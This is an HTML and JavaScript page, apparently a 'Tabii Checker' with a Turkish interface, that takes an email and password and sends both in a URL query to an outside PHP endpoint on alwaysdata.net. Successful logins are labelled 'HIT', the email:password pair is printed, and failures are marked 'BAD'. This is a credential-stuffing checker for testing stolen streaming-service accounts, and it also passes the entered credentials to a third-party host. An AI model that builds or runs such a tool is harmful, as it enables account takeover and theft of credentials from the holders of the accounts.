<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tabii Checker | Developer</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --bg: #0b0e14;
            --card: #151b23;
            --accent: #22c55e; /* Başarı için yeşil tonu */
            --input-bg: #0d1117;
            --border: #30363d;
            --text: #c9d1d9;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .checker-card {
            width: 100%;
            max-width: 400px;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
        }

        .header { text-align: center; margin-bottom: 24px; }
        .header h2 { margin: 0; color: #fff; font-size: 20px; }
        .header span { font-size: 12px; color: #8b949e; letter-spacing: 1px; }

        .input-box { margin-bottom: 16px; position: relative; }
        .input-box i { position: absolute; left: 12px; top: 38px; color: #8b949e; }
        
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #8b949e; }
        
        input {
            width: 100%;
            padding: 10px 10px 10px 35px;
            background: var(--input-bg);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: #fff;
            box-sizing: border-box;
            transition: 0.2s;
        }

        input:focus { border-color: #58a6ff; outline: none; box-shadow: 0 0 0 3px rgba(88,166,255,0.1); }

        button {
            width: 100%;
            padding: 12px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: 0.2s;
        }

        button:hover { background: #2ea043; }
        button:disabled { background: #23863680; cursor: not-allowed; }

        #resultArea {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            display: none;
            font-size: 14px;
            line-height: 1.5;
            word-break: break-all;
        }

        .hit { background: rgba(35, 134, 54, 0.15); border: 1px solid #238636; color: #3fb950; }
        .bad { background: rgba(248, 81, 73, 0.15); border: 1px solid #f85149; color: #f85149; }
    </style>
</head>
<body>

<div class="checker-card">
    <div class="header">
        <h2>TABII CHECKER</h2>
        <span>BURAK | DEVELOPER</span>
    </div>

    <div class="input-box">
        <label>E-posta Adresi</label>
        <i class="fas fa-envelope"></i>
        <input type="text" id="mail" placeholder="email@example.com">
    </div>

    <div class="input-box">
        <label>Şifre</label>
        <i class="fas fa-lock"></i>
        <input type="password" id="pass" placeholder="••••••••">
    </div>

    <button id="sorguBtn" onclick="calistir()">Sorguyu Başlat</button>

    <div id="resultArea"></div>
</div>

<script>
    async function calistir() {
        const mail = document.getElementById('mail').value;
        const pass = document.getElementById('pass').value;
        const btn = document.getElementById('sorguBtn');
        const res = document.getElementById('resultArea');

        if(!mail || !pass) {
            alert("Lütfen tüm alanları doldur!");
            return;
        }

        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Kontrol Ediliyor...';
        res.style.display = 'none';

        // Senin API URL'in
        const apiUrl = `https://vexsorgu-api.alwaysdata.net/api/tabiichecker.php?mail=${encodeURIComponent(mail)}&password=${encodeURIComponent(pass)}`;

        try {
            // Not: Eğer Alwaysdata CORS engeli koyduysa tarayıcıda çalışmayabilir.
            // Bu durumda bir PHP dosyası üzerinden "file_get_contents" ile çekmek gerekebilir.
            const response = await fetch(apiUrl);
            const data = await response.json();

            res.style.display = 'block';

            // API'den dönen veriye göre (Success/Fail kontrolü)
            // Genelde bu tarz API'ler "status" veya "message" döndürür.
            if (data.status === true || data.status === "success" || data.message?.includes("Başarılı")) {
                res.className = 'hit';
                res.innerHTML = `<strong>DURUM:</strong> HIT (Giriş Başarılı)<br>
                                 <strong>DATA:</strong> ${mail}:${pass}<br>
                                 <strong>DETAY:</strong> ${JSON.stringify(data.bilgi || data.message || 'Abonelik Aktif')}`;
            } else {
                res.className = 'bad';
                res.innerHTML = `<strong>DURUM:</strong> BAD (Hatalı/Abonelik Yok)<br>
                                 <strong>MESAJ:</strong> ${data.message || 'Giriş Başarısız'}`;
            }

        } catch (error) {
            res.style.display = 'block';
            res.className = 'bad';
            res.innerHTML = `<strong>HATA:</strong> API'ye bağlanılamadı veya CORS engeli var.<br>
                             <small>Konsolu (F12) kontrol et.</small>`;
            console.error("API Error:", error);
        } finally {
            btn.disabled = false;
            btn.innerHTML = 'Sorguyu Başlat';
        }
    }
</script>

</body>
</html>
